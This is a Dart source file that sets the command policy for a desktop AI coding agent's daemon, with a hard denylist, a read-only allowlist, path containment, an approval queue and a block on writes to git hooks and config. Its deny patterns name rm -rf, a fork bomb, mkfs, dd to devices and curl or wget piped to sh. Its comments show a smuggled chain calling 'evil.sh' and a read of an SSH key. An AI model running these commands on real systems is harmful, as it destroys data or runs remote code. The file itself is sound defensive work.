/// Command policy: decides whether `run_command` may execute a given command in a given
/// workspace root.
///
/// The full tiered-consent design (auto for reads, diff-and-approve for writes, an explicit YOLO
/// mode, all surfaced through a UI) is Unit 5/8 of the desktop Engineer agent work
/// (`docs/architecture/011-desktop-engineer-agent.md`) and needs the Flutter client to prompt a
/// human. This daemon has no UI yet -- it can be run headless, paired to an account, with nothing
/// watching it interactively. So rather than fake an "approve" prompt nobody can answer, this
/// module implements the one tier that is safe to run unattended: an explicit per-workspace
/// `trusted` flag the user sets out-of-band (`aura_hostd trust <path>`), plus a fixed allowlist of
/// read-only/inspection commands that are safe to run in an untrusted workspace without asking.
/// A command that is neither allowlisted nor in a trusted workspace is refused, not queued --
/// there is nobody to queue it for yet.
///
/// This is a real, deliberate scope cut, not silently dropped: it is stated here, in
/// `docs/architecture/011-desktop-engineer-agent.md`'s "Implementation status", and in the
/// roadmap. When the interactive UI lands, `trusted` becomes one of several tiers instead of the
/// only escape hatch, and the allowlist becomes the "auto-approve" tier rather than the only
/// thing that runs without it.
///
/// Command policy is layered *on top of* workspace containment (`containment.dart`), never a
/// substitute for it: a command permitted here still only ever runs with its working directory
/// inside the granted root, and `run_command`'s shell interpretation means containment is a
/// process-level control (via cwd), not a promise the shell command's own arguments cannot name a
/// path elsewhere -- exactly like the equivalent risk already accepted server-side by
/// `aura_backend/aura_core/tools/coding.py::run_command` against the Docker sandbox. The
/// difference here is there is no container boundary underneath; that is why the hard denylist
/// below exists in addition to the allowlist.
library;

import 'error_codes.dart';

/// Command prefixes that are always refused, in every workspace, trusted or not -- a floor no
/// consent tier is allowed to lift (ADR-011). This is deliberately conservative and pattern-based,
/// not a promise of completeness: it exists to catch the obviously catastrophic case (wiping the
/// workspace, or something that clearly isn't scoped to it), not to be a full shell-injection
/// sandbox. The real boundary is that these commands run as the user's own OS account with no
/// process-level containment beyond `cwd` -- treat this as a seatbelt, not a cage.
final List<RegExp> hardDenylistPatterns = [
  RegExp(r'\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\b'), // rm -rf and permutations (-fr, -Rf, ...)
  RegExp(r'\brm\s+-[a-zA-Z]*f[a-zA-Z]*r\b'),
  // The same two flags given separately (`rm -r -f`, `rm -f -r x`, long spellings), which
  // the combined-flag patterns above never matched (audit FSA-006).
  RegExp(r'\brm\b(?=.*\s-(-recursive|[a-zA-Z]*[rR])\b)(?=.*\s-(-force|[a-zA-Z]*f)\b)'),
  RegExp(r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;'), // fork bomb
  RegExp(r'\bmkfs\b'),
  RegExp(r'\bdd\s+.*of=/dev/'),
  RegExp(r'>\s*/dev/sd[a-z]'),
  RegExp(r'\bchmod\s+-R\s+000\b'),
  RegExp(r'\bcurl\b.*\|\s*sh\b'), // pipe-to-shell from the network
  RegExp(r'\bwget\b.*\|\s*sh\b'),
];

/// Any of these appearing anywhere in an untrusted-workspace command is an automatic refusal,
/// checked *before* the allowlist below. This is the fix for the bypass a naive "starts with an
/// allowlisted verb" prefix match would otherwise have: `readOnlyAllowlistPatterns` match a
/// prefix, not the whole string, so without this check `git status && curl evil.sh | attacker`
/// would pass the "starts with `git status`" test even though it does something the allowlist was
/// never meant to permit. Blocking every shell metacharacter first means a command that gets past
/// this point cannot smuggle a second command alongside the allowlisted one -- the prefix match
/// only becomes safe to trust once chaining, piping, redirection, and substitution are all ruled
/// out structurally rather than pattern-matched away one payload at a time.
final RegExp _shellMetacharacters = RegExp(r'[;&|`$<>\n]');

/// Commands safe to run without a trusted workspace: read-only inspection, the kind a linter or
/// CI dry-run would do. Matched as a prefix of the command, which is only safe because
/// [_shellMetacharacters] has already ruled out chaining/piping/redirection/substitution by the
/// time these are checked -- see that field's doc for why the ordering matters. A match is also
/// necessary but not sufficient: [_escapesReadOnlyTier] then refuses the argument shapes that
/// turn an inspection verb into a write or a read outside the workspace.
///
/// Verbs that *run repository-supplied code* are absent on purpose, however read-only they sound:
/// `npm test` runs the repo's `scripts.test`, `pytest --collect-only` imports `conftest.py` and
/// every test module, and `rg --pre <cmd>` runs `<cmd>` on each file it searches. In an untrusted
/// workspace -- a freshly cloned repo is exactly that -- those are arbitrary code execution.
final List<RegExp> readOnlyAllowlistPatterns = [
  RegExp(r'^git\s+(status|diff|log|show|blame)\b'),
  // `git branch <name>` creates and `-d/-m/-c` delete, rename and copy; `git remote add/remove`
  // rewrites `.git/config`. Only the listing forms are inspection.
  RegExp(r'^git\s+branch(\s+(-a|-r|-v|-vv|--all|--remotes|--list|--show-current))*\s*$'),
  RegExp(r'^git\s+remote(\s+(-v|--verbose))?\s*$'),
  // `find` is deliberately excluded despite being conceptually "read-only": `-delete`, `-exec`,
  // and `-fprintf` are all mutating actions expressible without any of the blocked shell
  // metacharacters above (e.g. `find . -delete`), so a bare `^find\b` prefix would not actually
  // bound what it does the way it does for `ls`/`cat`/`grep`, whose flag surface has no
  // destructive equivalent. `env` is excluded for a sharper reason: `env <command> [args...]`
  // *runs* `<command>` -- it is a general-purpose "execute anything" primitive wearing an
  // inspection-tool name, and allowlisting it would let any refused command through by prefixing
  // it with `env `.
  RegExp(r'^(ls|pwd|cat|head|tail|wc|grep|file|which)\b'),
  RegExp(r'^npm\s+(ls|list|outdated)\b'),
  RegExp(r'^(node|python3?|dart|flutter)\s+--version\s*$'),
];

/// git flags that make an otherwise read-only verb write a file (`--output`), run a configured
/// program (`--ext-diff`, `--textconv`), or read paths outside the repository (`--no-index`).
const List<String> _gitEscapeFlags = ['--output', '--ext-diff', '--textconv', '--no-index'];

/// Whether an allowlisted command uses an argument that takes it out of the read-only tier: one of
/// [_gitEscapeFlags], or a path that leaves the workspace (absolute, home-relative, a drive
/// letter, or a `..` segment) -- `cat ~/.ssh/id_rsa` or `grep -f /etc/x` would otherwise read
/// anything the user can, including this daemon's own control token.
///
/// Containment is checked on the *spelling* of each argument, including the value of a
/// `--flag=value` or a short flag with an attached value (`-f/etc/x`); it cannot see through a
/// symlink inside the workspace that points out of it. A command this refuses is not denied -- it
/// falls through to the approval tier, so a legitimate `grep -r "/api" .` still runs once a human
/// approves it.
bool _escapesReadOnlyTier(String command) {
  final tokens = command.split(RegExp(r'\s+')).map((t) => t.replaceAll(RegExp(r'''['"]'''), ''));
  final isGit = command.startsWith('git');
  for (final token in tokens) {
    if (isGit && _gitEscapeFlags.any((f) => token == f || token.startsWith('$f='))) {
      return true;
    }
    final candidates = <String>[token];
    final eq = token.indexOf('=');
    if (token.startsWith('-') && eq > 0) candidates.add(token.substring(eq + 1));
    if (token.startsWith('-') && !token.startsWith('--') && token.length > 2) {
      candidates.add(token.substring(2));
    }
    if (candidates.any(_leavesWorkspace)) return true;
  }
  return false;
}

/// Verbs that delete, move, overwrite or re-permission files, or run a program on each file
/// they find. In a *trusted* workspace every other command runs unquestioned, but these keep
/// argument containment (audit FSA-006): `rm -r ../sibling-project`, `find /home -delete` or
/// `cd .. && rm -r build` are refused even there. Trust means "this checkout's own tooling
/// may run"; it never meant "this daemon may destroy things outside the checkout", which is
/// the only extra power containment removes. Same spelling-based check as the read-only tier,
/// same limits (a symlink inside the workspace is not seen through).
final RegExp destructiveVerbPattern = RegExp(
  r'^(rm|rmdir|unlink|shred|truncate|mv|cp|dd|rsync|chmod|chown|chattr|tee|find'
  r'|git\s+(clean|reset|checkout|restore|rm|worktree\s+remove))\b',
);

/// Segment boundaries a trusted command may contain. Quoted operators are not understood; a
/// false split only makes the check stricter, never looser.
final RegExp _segmentSeparators = RegExp(r'&&|\|\||;|\||\n');

/// A refusal: a stable machine [code] (`error_codes.dart`) and the English [reason] shown to
/// apps that predate codes.
typedef PolicyRefusal = ({String code, String reason});

/// Why a trusted-workspace command is refused by destructive-verb containment, or `null` when
/// it is not. See [destructiveEscapeRefusal]; this is its English text alone.
String? destructiveEscapeReason(String command) => destructiveEscapeRefusal(command)?.reason;

/// Why a trusted-workspace command is refused by destructive-verb containment, or `null` when
/// it is not. Each shell segment is judged on its own verb; a `cd`/`pushd` that leaves the
/// workspace taints every destructive segment in the same command, since their relative paths
/// would then resolve outside it.
PolicyRefusal? destructiveEscapeRefusal(String command) {
  final segments = command
      .split(_segmentSeparators)
      .map((s) => s.trim())
      .where((s) => s.isNotEmpty)
      .toList();
  var changesDirectoryOutside = false;
  var hasDestructive = false;
  for (final segment in segments) {
    if (RegExp(r'^(cd|pushd)\b').hasMatch(segment) &&
        _argumentTokens(segment).skip(1).any(_leavesWorkspace)) {
      changesDirectoryOutside = true;
    }
    if (destructiveVerbPattern.hasMatch(segment)) {
      hasDestructive = true;
      if (_argumentsLeaveWorkspace(segment)) {
        return (
          code: HostdErrorCode.destructivePathOutsideWorkspace,
          reason: 'destructive command names a path outside the workspace; containment applies '
              'even in a trusted workspace',
        );
      }
    }
  }
  if (changesDirectoryOutside && hasDestructive) {
    return (
      code: HostdErrorCode.destructiveAfterLeavingWorkspace,
      reason: 'command changes directory out of the workspace and then runs a destructive '
          'command; containment applies even in a trusted workspace',
    );
  }
  return null;
}

Iterable<String> _argumentTokens(String command) =>
    command.split(RegExp(r'\s+')).map((t) => t.replaceAll(RegExp(r'''['"]'''), ''));

/// Whether any argument (including `--flag=value` and attached short-flag values) leaves the
/// workspace -- the path half of [_escapesReadOnlyTier], shared with [destructiveEscapeReason].
bool _argumentsLeaveWorkspace(String command) {
  for (final token in _argumentTokens(command)) {
    final candidates = <String>[token];
    final eq = token.indexOf('=');
    if (token.startsWith('-') && eq > 0) candidates.add(token.substring(eq + 1));
    if (token.startsWith('-') && !token.startsWith('--') && token.length > 2) {
      candidates.add(token.substring(2));
    }
    if (candidates.any(_leavesWorkspace)) return true;
  }
  return false;
}

bool _leavesWorkspace(String path) {
  if (path.startsWith('/') || path.startsWith('~') || path.startsWith(r'\')) return true;
  if (RegExp(r'^[A-Za-z]:').hasMatch(path)) return true;
  return path.split(RegExp(r'[/\\]')).contains('..');
}

/// `needsApproval` is D5's interactive consent tier (`docs/architecture/015-desktop-ide.md`):
/// a command that is neither hard-denied nor allowlisted, in an untrusted workspace, is queued
/// for a human to approve or reject through the Desktop IDE rather than refused outright -- see
/// `approval_queue.dart` and `task_handler.dart::run`, which is the only caller that acts on it.
enum CommandDecision { allow, deny, needsApproval }

class CommandVerdict {
  const CommandVerdict(this.decision, this.reason, {required this.code});
  final CommandDecision decision;

  /// English, for people and for apps that predate [code]. Never parsed.
  final String reason;

  /// Stable machine code for [reason] (`error_codes.dart`), which an app translates.
  final String code;

  bool get isAllowed => decision == CommandDecision.allow;
}

/// [allowApprovalQueue] controls what the final, otherwise-unhandled case resolves to: a
/// `needsApproval` verdict (default) when a human might be watching to answer it, or a flat
/// `deny` when nobody is -- a future headless-only invocation path can pass `false` to keep the
/// pre-D5 "refuse outright" behavior instead of queuing something nobody will ever see.
CommandVerdict evaluateCommand(
  String command, {
  required bool workspaceTrusted,
  bool allowApprovalQueue = true,
}) {
  final trimmed = command.trim();
  for (final pattern in hardDenylistPatterns) {
    if (pattern.hasMatch(trimmed)) {
      return const CommandVerdict(
        CommandDecision.deny,
        'command matches the hard denylist and is refused in every workspace',
        code: HostdErrorCode.commandHardDenied,
      );
    }
  }
  if (workspaceTrusted) {
    final escape = destructiveEscapeRefusal(trimmed);
    if (escape != null) {
      return CommandVerdict(CommandDecision.deny, escape.reason, code: escape.code);
    }
    return const CommandVerdict(
      CommandDecision.allow,
      'workspace is marked trusted',
      code: HostdErrorCode.workspaceTrusted,
    );
  }
  if (_shellMetacharacters.hasMatch(trimmed)) {
    return const CommandVerdict(
      CommandDecision.deny,
      'untrusted workspaces only run a single simple read-only command -- no chaining (&&, ;, '
      '|), redirection, substitution, or backticks -- this is a hard floor, never queued for '
      'approval',
      code: HostdErrorCode.untrustedShellSyntax,
    );
  }
  for (final pattern in readOnlyAllowlistPatterns) {
    if (pattern.hasMatch(trimmed) && !_escapesReadOnlyTier(trimmed)) {
      return const CommandVerdict(
        CommandDecision.allow,
        'read-only command allowlisted for untrusted workspaces',
        code: HostdErrorCode.readOnlyAllowlisted,
      );
    }
  }
  if (allowApprovalQueue) {
    return const CommandVerdict(
      CommandDecision.needsApproval,
      'workspace is not trusted and this command is not on the read-only allowlist -- queued '
      'for interactive approval in the Desktop IDE',
      code: HostdErrorCode.commandNeedsApproval,
    );
  }
  return const CommandVerdict(
    CommandDecision.deny,
    'workspace is not trusted and this command is not on the read-only allowlist -- run '
    '`aura_hostd trust <path>` for this workspace, or connect a Desktop IDE session to answer '
    'interactive approval requests',
    code: HostdErrorCode.commandNotAllowlisted,
  );
}

/// D6's write-gating sibling to [evaluateCommand] -- a file write isn't a shell command string, so
/// this deliberately does not reuse `evaluateCommand`'s regex-based allow/deny/needsApproval logic.
/// It is also structurally simpler: there is no shell-metacharacter concern for a write (nothing
/// here is ever interpreted by a shell) and no read-only-allowlist tier (every write mutates by
/// definition, so an untrusted workspace's only two outcomes are `needsApproval` or `deny`).
///
/// There is also no hard-denylist tier for writes today, unlike [hardDenylistPatterns] for
/// commands -- containment (`containment.dart`'s `requireContained`, checked before this is ever
/// called) already bounds *where* a write can land; there is no established equivalent yet for
/// *what* it may contain or overwrite (e.g. a `.git/hooks/` file). This is D6's accepted floor, not
/// an oversight: a human reviewing the diff before approving is the safety net for untrusted
/// workspaces, the same way it already is for the read-only-allowlist gap in
/// [readOnlyAllowlistPatterns]'s own doc comment.
CommandVerdict evaluateWrite({required bool workspaceTrusted}) {
  if (workspaceTrusted) {
    return const CommandVerdict(
      CommandDecision.allow,
      'workspace is marked trusted',
      code: HostdErrorCode.workspaceTrusted,
    );
  }
  return const CommandVerdict(
    CommandDecision.needsApproval,
    'workspace is not trusted -- queued for interactive approval in the Desktop IDE',
    code: HostdErrorCode.writeNeedsApproval,
  );
}

/// Why a write to [absolutePath] is refused outright, in every workspace, or null when it isn't.
///
/// A file under `.git/hooks/` is a program git runs on the next commit, checkout or push, and
/// `.git/config` can point `core.hooksPath`, a `core.fsmonitor` command or a filter driver at
/// one. Either turns an ordinary-looking file write into code execution the moment the user (or
/// the agent) next runs git -- in an untrusted folder behind an approval that shows only a diff,
/// in a trusted one with no prompt at all. Neither is something an editing task needs, so no
/// consent tier lifts this, the same as [hardDenylistPatterns] for commands.
String? protectedGitWriteReason(String absolutePath) => protectedGitWriteRefusal(absolutePath)?.reason;

/// [protectedGitWriteReason] with its stable machine code.
PolicyRefusal? protectedGitWriteRefusal(String absolutePath) {
  final parts = absolutePath.split(RegExp(r'[/\\]')).where((s) => s.isNotEmpty).toList();
  for (var i = 0; i < parts.length - 1; i++) {
    if (parts[i] != '.git') continue;
    final next = parts[i + 1];
    if (next == 'hooks') {
      return (
        code: HostdErrorCode.protectedGitHooks,
        reason: 'writes under .git/hooks are refused: a hook is a program git runs on the next '
            'commit, checkout or push',
      );
    }
    if (next == 'config' && i + 2 == parts.length) {
      return (
        code: HostdErrorCode.protectedGitConfig,
        reason: 'writes to .git/config are refused: it can point git at a program to run '
            '(core.hooksPath, core.fsmonitor, filter drivers)',
      );
    }
  }
  return null;
}
